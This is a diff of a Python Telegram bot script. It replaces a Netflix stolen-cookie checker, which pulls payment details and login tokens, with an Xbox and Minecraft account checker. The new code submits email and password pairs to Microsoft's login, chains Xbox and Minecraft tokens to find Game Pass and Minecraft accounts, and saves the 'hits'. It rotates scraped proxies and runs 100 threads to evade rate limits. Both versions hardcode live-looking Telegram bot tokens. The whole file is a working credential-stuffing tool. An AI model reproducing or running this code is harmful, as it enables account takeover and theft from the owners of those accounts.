@@ -1,581 +1,1310 @@
+# idk.py
+import asyncio
+import subprocess
+import sys
 import os
 import re
-import json
-import random
 import time
-import sqlite3
-import string
-import asyncio
-import urllib3
-import urllib.parse
-from datetime import datetime
-import requests
+import json
+import secrets
+import random
+import socket
+import socks
+from datetime import datetime, timedelta
+from urllib.parse import urlparse, parse_qs
+from typing import Optional, Dict, List
+from dataclasses import dataclass
+from enum import Enum
+from collections import deque
+import threading
+import concurrent.futures
+import aiohttp
+import aiofiles
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
-from telegram.ext import (
-    ApplicationBuilder,
-    CommandHandler,
-    MessageHandler,
-    CallbackQueryHandler,
-    ContextTypes,
-    filters,
-)
+try:
+    import requests
+    import urllib3
+    import warnings
+    from aiogram import Bot, Dispatcher, types
+    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, FSInputFile
+    from aiogram.filters import Command, CommandObject
+    from aiogram import F
+    from aiogram.utils.keyboard import InlineKeyboardBuilder
+    from colorama import Fore, Style, init
+    MODULES_INSTALLED = True
+except ImportError:
+    MODULES_INSTALLED = False
 
-# Disable SSL warnings and initialize
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# CONFIGURATION
-TELEGRAM_BOT_TOKEN = "8597687291:AAGoa2PQL6glLjyT2Tb-qH8MXRm9h_8jutc"
-OWNER_HANDLE = "@kudsoo"
-BOT_HANDLE = "@kudasaixddbot"
-
-REQUIRED_CHANNEL = "@kudsiontop"
-CHANNEL_LINK = "https://t.me/kudsiontop"
-
-REQUIRED_GROUP = "@kudasaiisimpressed"
-GROUP_LINK = "https://t.me/kudasaiisimpressed"
-
-ADMIN_IDS = [8511482382]  # Your Admin Telegram ID
-
-# Concurrency Queue Limiter (e.g., max 3 simultaneous checks to prevent rate limits)
-CHECK_SEMAPHORE = asyncio.Semaphore(3)
-
-# ==================== DATABASE SETUP ====================
-DB_NAME = "netflix_bot.db"
-
-def get_db():
-    conn = sqlite3.connect(DB_NAME, check_same_thread=False)
-    conn.row_factory = sqlite3.Row
-    return conn
-
-def init_db():
-    conn = get_db()
-    cursor = conn.cursor()
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS users (
-            user_id INTEGER PRIMARY KEY,
-            username TEXT,
-            checks_count INTEGER DEFAULT 0
-        )
-    """)
-    conn.commit()
-    conn.close()
-
-init_db()
-
-def db_query(query, params=(), fetch=None):
-    conn = get_db()
-    cursor = conn.cursor()
+if not MODULES_INSTALLED:
+    print("Installing required modules...")
+    modules = ["requests", "aiogram", "urllib3", "colorama", "aiohttp", "aiofiles", "pysocks"]
     try:
-        cursor.execute(query, params)
-        result = None
-        if fetch == "one":
-            row = cursor.fetchone()
-            result = dict(row) if row else None
-        elif fetch == "all":
-            result = [dict(row) for row in cursor.fetchall()]
-        conn.commit()
-        return result
+        subprocess.check_call([sys.executable, "-m", "pip", "install"] + modules,
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("✓ Modules installed! Please restart the script.")
+        sys.exit(0)
     except Exception as e:
-        print(f"[-] DB Error: {e} | Query: {query}")
-        return None
-    finally:
-        conn.close()
+        print(f"Error: {e}\nInstall manually: pip install {' '.join(modules)}")
+        sys.exit(1)
 
-async def check_memberships(bot, user_id):
-    if user_id in ADMIN_IDS:
-        return True, True
-    
-    is_channel_joined = True
-    is_group_joined = True
+import urllib3
+import warnings
 
-    try:
-        member_ch = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
-        if member_ch.status not in ["creator", "administrator", "member"]:
-            is_channel_joined = False
-    except Exception:
-        pass
+init(autoreset=True)
+urllib3.disable_warnings()
+warnings.filterwarnings("ignore")
 
-    try:
-        member_gp = await bot.get_chat_member(chat_id=REQUIRED_GROUP, user_id=user_id)
-        if member_gp.status not in ["creator", "administrator", "member", "restricted"]:
-            is_group_joined = False
-    except Exception:
-        pass
+# ══════════════════════════════════════════════
+# BOT CONFIGURATION
+BOT_NAME = "✨ XBOX CHECKER"
+BOT_VERSION = "v3.2-RATELIMIT-FIXED"
+OWNER_USERNAME = "@kudsoo"
+OWNER_NAME = "Kudasai"
+BOT_CHANNEL = "https://t.me/kudsiontop"
 
-    return is_channel_joined, is_group_joined
+# Bot token - set this
+BOT_TOKEN = "8817570520:AAHEb60y7tNqo1vwgtHpU9i3Mx0cCNUhM4c"
 
-# ==================== NETFLIX SCRAPER & TOKENIZER ====================
+# ══════════════════════════════════════════════
+# ADMIN CONFIGURATION
+ADMIN_IDS = [
+    8511482382,  # Your Telegram ID
+]
 
-UA_WEB = (
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-    "AppleWebKit/537.36 (KHTML, like Gecko) "
-    "Chrome/131.0.0.0 Safari/537.36"
+OWNER_ID = 8511482382
+
+MY_SIGNATURE = "Kudasai (@kudsoo)"
+
+def is_admin(user_id: int) -> bool:
+    return user_id in ADMIN_IDS or user_id == OWNER_ID
+
+def is_owner(user_id: int) -> bool:
+    return user_id == OWNER_ID
+
+# ══════════════════════════════════════════════
+# CHECKER CONFIGURATION
+SFTAG_URL = (
+    "https://login.live.com/oauth20_authorize.srf"
+    "?client_id=00000000402B5328"
+    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
+    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
+    "&display=touch&response_type=token&locale=en"
 )
 
-COUNTRY_FLAGS = {
-    "US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹",
-    "TR":"🇹🇷","BR":"🇧🇷","JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦",
-    "AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰",
-    "FI":"🇫🇮","PL":"🇵🇱","RU":"🇷🇺","AR":"🇦🇷","CL":"🇨🇱","CO":"🇨🇴",
-    "PE":"🇵🇪","AE":"🇦🇪","SA":"🇸🇦","EG":"🇪🇬","ZA":"🇿🇦","ID":"🇮🇩",
-    "MY":"🇲🇾","SG":"🇸🇬","TH":"🇹🇭","VN":"🇻🇳","PH":"🇵🇭","KE":"🇰🇪",
-    "NG":"🇳🇬","GH":"🇬🇭","PT":"🇵🇹","RO":"🇷🇴","HU":"🇭🇺","CZ":"🇨🇿",
-    "UA":"🇺🇦","AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","IL":"🇮🇱","TW":"🇹🇼",
-    "HK":"🇭🇰","PK":"🇵🇰","BO":"🇧🇴","GT":"🇬🇹","EC":"🇨🇦","UY":"🇺🇾",
-    "NZ":"🇳🇿","ZW":"🇿🇼","SK":"🇸🇰","HR":"🇭🇷","RS":"🇷🇸","BG":"🇧🇬",
-}
-COUNTRY_NAMES = {
-    "US":"United States","GB":"United Kingdom","DE":"Germany","FR":"France",
-    "ES":"Spain","IT":"Italy","TR":"Turkey","BR":"Brazil","JP":"Japan",
-    "KR":"South Korea","IN":"India","CA":"Canada","AU":"Australia","MX":"Mexico",
-    "NL":"Netherlands","SE":"Sweden","NO":"Norway","DK":"Denmark","FI":"Finland",
-    "PL":"Poland","RU":"Russia","AR":"Argentina","CL":"Chile","CO":"Colombia",
-    "PE":"Peru","AE":"UAE","SA":"Saudi Arabia","EG":"Egypt","ZA":"South Africa",
-    "ID":"Indonesia","MY":"Malaysia","SG":"Singapore","TH":"Thailand","VN":"Vietnam",
-    "PH":"Philippines","KE":"Kenya","NG":"Nigeria","GH":"Ghana","PT":"Portugal",
-    "RO":"Romania","HU":"Hungary","CZ":"Czech Republic","UA":"Ukraine",
-    "AT":"Austria","CH":"Switzerland","BE":"Belgium","IL":"Israel","TW":"Taiwan",
-    "HK":"Hong Kong","PK":"Pakistan","NZ":"New Zealand","SK":"Slovakia",
-    "HR":"Croatia","RS":"Serbia","BG":"Bulgaria",
-}
+MAX_RETRIES = 2
+REQUEST_TIMEOUT = 7
+THREAD_COUNT = 100
 
-def _djs(s):
-    if not s:
-        return ""
-    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
-    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
-    return s.strip()
+# ══════════════════════════════════════════════
+# QUEUE SYSTEM
+class CheckQueue:
+    def __init__(self):
+        self.queue = deque()
+        self.processing = False
+        self.lock = threading.Lock()
+        
+    def add_to_queue(self, user_id: int, task_type: str, data: dict, message_obj=None) -> int:
+        with self.lock:
+            for i, task in enumerate(self.queue):
+                if task['user_id'] == user_id and task['status'] == 'pending':
+                    return -1
+            
+            priority = 0 if is_admin(user_id) else 1
+            
+            position = len(self.queue)
+            for i, task in enumerate(self.queue):
+                if task['priority'] > priority:
+                    position = i
+                    break
+            
+            task = {
+                'user_id': user_id,
+                'task_type': task_type,
+                'data': data,
+                'message_obj': message_obj,
+                'priority': priority,
+                'status': 'pending',
+                'added_at': datetime.now().isoformat(),
+                'position': position
+            }
+            
+            self.queue.insert(position, task)
+            for i, t in enumerate(self.queue):
+                t['position'] = i
+            return position
+    
+    def get_queue_position(self, user_id: int) -> Optional[int]:
+        with self.lock:
+            for i, task in enumerate(self.queue):
+                if task['user_id'] == user_id and task['status'] == 'pending':
+                    return i + 1
+            return None
+    
+    def get_queue_length(self) -> int:
+        with self.lock:
+            return len([t for t in self.queue if t['status'] == 'pending'])
+    
+    def get_queue_status(self) -> dict:
+        with self.lock:
+            pending = [t for t in self.queue if t['status'] == 'pending']
+            return {
+                'total': len(pending),
+                'admins': len([t for t in pending if t['priority'] == 0]),
+                'users': len([t for t in pending if t['priority'] == 1]),
+                'pending': pending
+            }
+    
+    def get_next_task(self):
+        with self.lock:
+            for task in self.queue:
+                if task['status'] == 'pending':
+                    task['status'] = 'processing'
+                    return task
+            return None
+    
+    def complete_task(self, user_id: int):
+        with self.lock:
+            for i, task in enumerate(self.queue):
+                if task['user_id'] == user_id and task['status'] == 'processing':
+                    del self.queue[i]
+                    for j, t in enumerate(self.queue):
+                        t['position'] = j
+                    return True
+            return False
 
-def _rx(pattern, text, default=""):
-    m = re.search(pattern, text, re.S)
-    return m.group(1) if m else default
+check_queue = CheckQueue()
 
-def _rx_all(pattern, text):
-    return re.findall(pattern, text, re.S)
+# ══════════════════════════════════════════════
+# DATA STORAGE
+class Database:
+    def __init__(self):
+        self.users_file = "data/users.json"
+        self.results_file = "data/results.json"
+        
+        os.makedirs("data", exist_ok=True)
+        os.makedirs("Results/Minecraft", exist_ok=True)
+        os.makedirs("Results/GamePass", exist_ok=True)
+        os.makedirs("Results/Xbox", exist_ok=True)
+        os.makedirs("Results/2FA", exist_ok=True)
+        self._load_data()
 
-def _flag(cc):
-    return COUNTRY_FLAGS.get((cc or "").upper(), "🌍")
+    def _load_data(self):
+        self.users = self._load_json(self.users_file) or {}
+        self.results = self._load_json(self.results_file) or {"hits": [], "total_checked": 0}
 
-def _country(cc):
-    return COUNTRY_NAMES.get((cc or "").upper(), cc or "Unknown")
-
-def load_cookies(text):
-    text = text.strip()
-    if text.startswith("[") or text.startswith("{"):
+    def _load_json(self, filepath):
         try:
-            data = json.loads(text)
-            if isinstance(data, list):
-                return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
-            if isinstance(data, dict):
-                return data
-        except Exception:
+            with open(filepath, 'r') as f:
+                return json.load(f)
+        except (FileNotFoundError, json.JSONDecodeError):
+            return None
+
+    def _save_json(self, filepath, data):
+        with open(filepath, 'w') as f:
+            json.dump(data, f, indent=2)
+
+    def save_all(self):
+        self._save_json(self.users_file, self.users)
+        self._save_json(self.results_file, self.results)
+
+    def get_user(self, user_id: int) -> dict:
+        user_id = str(user_id)
+        if user_id not in self.users:
+            self.users[user_id] = {
+                "total_checks": 0,
+                "hits": 0,
+                "joined": datetime.now().isoformat(),
+                "username": None,
+                "first_name": None,
+                "proxy_type": "none",
+                "proxies": []
+            }
+            self.save_all()
+        return self.users[user_id]
+
+    def update_user(self, user_id: int, data: dict):
+        user_id = str(user_id)
+        if user_id not in self.users:
+            self.users[user_id] = {"proxies": [], "proxy_type": "none"}
+        self.users[user_id].update(data)
+        self.save_all()
+
+    def use_check(self, user_id: int):
+        user = self.get_user(user_id)
+        user["total_checks"] = user.get("total_checks", 0) + 1
+        self.results["total_checked"] = self.results.get("total_checked", 0) + 1
+        self.save_all()
+
+    def add_hit(self, hit_data: dict):
+        self.results["hits"].append(hit_data)
+        self.save_all()
+
+    def get_stats(self) -> dict:
+        total_users = len(self.users)
+        total_checks = sum(u.get("total_checks", 0) for u in self.users.values())
+        total_hits = sum(u.get("hits", 0) for u in self.users.values())
+        
+        top_users = sorted(
+            [(uid, data.get("hits", 0), data.get("username", "Unknown")) 
+             for uid, data in self.users.items()],
+            key=lambda x: x[1],
+            reverse=True
+        )[:5]
+        
+        return {
+            "total_users": total_users,
+            "total_checks": total_checks,
+            "total_hits": total_hits,
+            "top_users": top_users
+        }
+
+db = Database()
+
+# ══════════════════════════════════════════════
+# PROXY FUNCTIONS
+def get_user_proxy(user_id: int) -> Optional[dict]:
+    user = db.get_user(user_id)
+    proxy_type = user.get("proxy_type", "none")
+    proxylist = user.get("proxies", [])
+    
+    if proxy_type == "none" or len(proxylist) == 0:
+        return None
+    
+    try:
+        proxy = random.choice(proxylist)
+        if proxy_type == "http":
+            return {'http': 'http://' + proxy, 'https': 'http://' + proxy}
+        elif proxy_type == "socks4":
+            return {'http': 'socks4://' + proxy, 'https': 'socks4://' + proxy}
+        elif proxy_type == "socks5":
+            return {'http': 'socks5://' + proxy, 'https': 'socks5://' + proxy}
+        else:
+            return {'http': 'http://' + proxy, 'https': 'http://' + proxy}
+    except:
+        return None
+
+def set_user_proxy_type(user_id: int, proxy_type: str):
+    user = db.get_user(user_id)
+    user["proxy_type"] = proxy_type
+    db.save_all()
+
+def scrape_user_proxies(user_id: int) -> int:
+    user = db.get_user(user_id)
+    http_proxies, socks4_proxies, socks5_proxies = [], [], []
+    
+    api_http = [
+        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
+        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
+    ]
+    api_socks4 = [
+        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
+        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"
+    ]
+    api_socks5 = [
+        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
+        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
+    ]
+    
+    for service in api_http:
+        try:
+            resp = requests.get(service, timeout=30)
+            http_proxies.extend(resp.text.splitlines())
+        except:
+            pass
+    for service in api_socks4:
+        try:
+            resp = requests.get(service, timeout=30)
+            socks4_proxies.extend(resp.text.splitlines())
+        except:
+            pass
+    for service in api_socks5:
+        try:
+            resp = requests.get(service, timeout=30)
+            socks5_proxies.extend(resp.text.splitlines())
+        except:
             pass
     
-    cookies = {}
-    for line in text.splitlines():
-        line = line.strip()
-        if not line or line.startswith("#"):
-            continue
-        parts = re.split(r'\s+', line, maxsplit=6)
-        if len(parts) >= 7:
-            cookies[parts[5].strip()] = parts[6].strip()
-            
-    if cookies:
-        return cookies
+    all_proxies = list(set(
+        [p.strip() for p in http_proxies if p.strip()] +
+        [p.strip() for p in socks4_proxies if p.strip()] +
+        [p.strip() for p in socks5_proxies if p.strip()]
+    ))
+    
+    user["proxies"] = all_proxies
+    db.save_all()
+    return len(all_proxies)
 
-    for part in re.split(r"[;\n]", text):
-        part = part.strip()
-        if "=" in part:
-            k, _, v = part.partition("=")
-            k, v = k.strip(), v.strip()
-            if k:
-                cookies[k] = v
-    return cookies
+# ══════════════════════════════════════════════
+# CHECKER FUNCTIONS
+def get_sftag(session, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
+            text = response.text
+            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
+            if match:
+                sftag = match.group(1)
+                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
+                if match:
+                    return match.group(1), sftag
+        except:
+            pass
+        time.sleep(0.5)
+    return None, None
 
-_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
-_IOS_PARAMS = {
-    "appVersion": "15.48.1",
-    "config": ('{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false",'
-               '"cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true",'
-               '"billboardEnabled":"true","sharksEnabled":"true",'
-               '"useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}'),
-    "device_type": "NFAPPL-02-",
-    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
-    "idiom": "phone",
-    "iosVersion": "15.8.5",
-    "isTablet": "false",
-    "languages": "en-US",
-    "locale": "en-US",
-    "maxDeviceWidth": "375",
-    "model": "saget",
-    "modelType": "IPHONE8-1",
-    "odpAware": "true",
-    "path": '["account","token","default"]',
-    "pathFormat": "graph",
-    "pixelDensity": "2.0",
-    "progressive": "false",
-    "responseFormat": "json",
-}
-_IOS_HEADERS = {
-    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
-    "x-netflix.request.attempt": "1",
-    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
-    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
-    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
-    "x-netflix.context.app-version": "15.48.1",
-    "x-netflix.argo.translated": "true",
-    "x-netflix.context.form-factor": "phone",
-    "x-netflix.context.sdk-version": "2012.4",
-    "x-netflix.client.appversion": "15.48.1",
-    "x-netflix.context.max-device-width": "375",
-    "x-netflix.context.ab-tests": "",
-    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
-    "x-netflix.client.type": "argo",
-    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
-    "x-netflix.context.locales": "en-US",
-    "x-netflix.argo.abtests": "",
-    "x-netflix.context.os-version": "15.8.5",
-    "x-netflix.request.client.context": '{"appState":"foreground"}',
-    "x-netflix.context.ui-flavor": "argo",
-    "x-netflix.argo.nfnsm": "9",
-    "x-netflix.context.pixel-density": "2.0",
-    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
-    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
-}
+def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
+            login_request = session.post(
+                url_post, data=data,
+                headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                allow_redirects=True, timeout=REQUEST_TIMEOUT
+            )
+            if '#' in login_request.url and login_request.url != SFTAG_URL:
+                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
+                if token != "None":
+                    return token, "success"
+            elif 'cancel?mkt=' in login_request.text:
+                try:
+                    d = {
+                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
+                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
+                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
+                    }
+                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
+                    ret = session.post(action_url, data=d, allow_redirects=True, timeout=REQUEST_TIMEOUT)
+                    return_url = re.search(r'(?<="recoveryCancel":\{"returnUrl":").+?(?=")', ret.text).group()
+                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
+                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
+                    if token != "None":
+                        return token, "success"
+                except:
+                    pass
+            elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
+                return None, "2fa"
+            elif "tried to sign in too many times" in login_request.text.lower() or "blocked" in login_request.text.lower():
+                return None, "ratelimit"
+            elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account"]):
+                return None, "bad"
+        except:
+            if attempt == max_attempts - 1:
+                return None, "error"
+        time.sleep(0.5)
+    return None, "error"
 
-def generate_nftoken(netflix_id_raw, timeout=15):
-    if not netflix_id_raw:
-        return None
-    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
-    headers = dict(_IOS_HEADERS)
-    headers["Cookie"] = f"NetflixId={netflix_id}"
+def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            payload = {
+                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
+                "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"
+            }
+            response = session.post(
+                'https://user.auth.xboxlive.com/user/authenticate',
+                json=payload,
+                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
+                timeout=REQUEST_TIMEOUT
+            )
+            if response.status_code == 200:
+                data = response.json()
+                xbox_token = data.get('Token')
+                if xbox_token:
+                    uhs = data['DisplayClaims']['xui'][0]['uhs']
+                    return xbox_token, uhs
+            elif response.status_code == 429:
+                time.sleep(2)
+                continue
+        except:
+            if attempt == max_attempts - 1:
+                return None, None
+        time.sleep(0.5)
+    return None, None
 
-    try:
-        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, timeout=timeout, verify=False)
-        if r.status_code == 200:
-            data = r.json()
-            tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
-            if tok:
-                return str(tok)
-    except Exception:
-        pass
+def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            payload = {
+                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
+                "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"
+            }
+            response = session.post(
+                'https://xsts.auth.xboxlive.com/xsts/authorize',
+                json=payload,
+                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
+                timeout=REQUEST_TIMEOUT
+            )
+            if response.status_code == 200:
+                return response.json().get('Token')
+            elif response.status_code == 429:
+                time.sleep(2)
+                continue
+        except:
+            if attempt == max_attempts - 1:
+                return None
+        time.sleep(0.5)
     return None
 
-def check_account(cookies: dict, timeout=20):
-    if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
-        return None
+def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            response = session.post(
+                'https://api.minecraftservices.com/authentication/login_with_xbox',
+                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
+                headers={'Content-Type': 'application/json'},
+                timeout=REQUEST_TIMEOUT
+            )
+            if response.status_code == 200:
+                return response.json().get('access_token')
+            elif response.status_code == 429:
+                time.sleep(2)
+                continue
+        except:
+            if attempt == max_attempts - 1:
+                return None
+        time.sleep(0.5)
+    return None
 
-    sess = requests.Session()
-    sess.headers.update({
-        "User-Agent": UA_WEB,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
-        "DNT": "1",
-    })
-    for k, v in cookies.items():
-        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
+def check_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            response = session.get(
+                'https://api.minecraftservices.com/entitlements/mcstore',
+                headers={'Authorization': f'Bearer {mc_token}'},
+                timeout=REQUEST_TIMEOUT
+            )
+            if response.status_code == 200:
+                text = response.text
+                if 'product_game_pass_ultimate' in text:
+                    return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
+                elif 'product_game_pass_pc' in text or 'product_game_pass_console' in text:
+                    return 'Xbox Game Pass', ["Xbox Game Pass"]
+                elif '"product_minecraft"' in text or '"game_minecraft"' in text:
+                    return 'Minecraft', ["Minecraft Java"]
+                else:
+                    others = []
+                    if 'product_minecraft_bedrock' in text:
+                        others.append("Bedrock")
+                    if 'product_legends' in text:
+                        others.append("Legends")
+                    if 'product_dungeons' in text:
+                        others.append("Dungeons")
+                    if others:
+                        return 'Xbox: ' + ', '.join(others), others
+                    return None, []
+            elif response.status_code == 429:
+                time.sleep(2)
+                continue
+            else:
+                return None, []
+        except:
+            if attempt == max_attempts - 1:
+                return None, []
+        time.sleep(0.5)
+    return None, []
 
-    try:
-        r = sess.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout)
-    except requests.RequestException:
-        return None
+def get_profile(session, mc_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            response = session.get(
+                'https://api.minecraftservices.com/minecraft/profile',
+                headers={'Authorization': f'Bearer {mc_token}'},
+                timeout=REQUEST_TIMEOUT
+            )
+            if response.status_code == 200:
+                return response.json()
+            elif response.status_code == 404:
+                return None
+            elif response.status_code == 429:
+                time.sleep(2)
+                continue
+        except:
+            if attempt == max_attempts - 1:
+                return None
+        time.sleep(0.5)
+    return None
 
-    if "login" in r.url.lower() or r.status_code in (401, 403):
-        return None
+def get_xbox_profile(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            auth_header = f"XBL3.0 x={uhs};{xsts_token}"
+            response = session.get(
+                "https://profile.xboxlive.com/users/me/profile/settings"
+                "?settings=Gamertag,GameDisplayPicRaw,AccountTier",
+                headers={
+                    "Authorization": auth_header,
+                    "x-xbl-contract-version": "2",
+                    "Accept": "application/json",
+                    "Accept-Language": "en-US",
+                },
+                timeout=REQUEST_TIMEOUT
+            )
+            if response.status_code == 200:
+                data = response.json()
+                settings = {
+                    s["id"]: s.get("value", "N/A")
+                    for s in data.get("profileUsers", [{}])[0].get("settings", [])
+                }
+                return {
+                    "gamertag": settings.get("Gamertag", "N/A"),
+                    "gamerpic": settings.get("GameDisplayPicRaw", ""),
+                    "tier": settings.get("AccountTier", "N/A")
+                }
+            elif response.status_code == 429:
+                time.sleep(2)
+                continue
+        except:
+            pass
+        time.sleep(0.3)
+    return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A"}
 
-    html = r.text
-    if '"membershipStatus":"CURRENT_MEMBER"' not in html:
-        return None
-
-    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
-    name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html)) or _djs(_rx(r'"firstName":"([^"]+)"', html))
-    cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")
-    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
-    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
-    quality = {"UHD": "UHD 4K", "FHD": "FHD 1080p", "HD": "HD 720p", "SD": "SD 480p"}.get(q_raw, q_raw or "N/A")
-    streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
-
-    _pm_start = html.find('"paymentMethods"')
-    pm_raw = html[_pm_start:_pm_start + 3000] if _pm_start >= 0 else ""
-    card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw) or _rx(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
-    pay_type = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
-    card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw) or _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
-    phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"
-    phone_verified = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html) == "true"
-    extra_slots = int(_rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0") or 0)
-    free_trial = '"isInFreeTrial":true' in html
-
-    profiles = [_djs(p) for p in _rx_all(r'"profileName":"([^"]+)"', html)]
-    seen, profiles_clean = set(), []
-    for p in profiles:
-        if p and p not in seen:
-            seen.add(p)
-            profiles_clean.append(p)
-
-    netflix_id_raw = cookies.get("NetflixId", "")
-    tok = generate_nftoken(netflix_id_raw, timeout) if netflix_id_raw else None
-    
-    if tok:
-        tok_safe = urllib.parse.quote(tok, safe="")
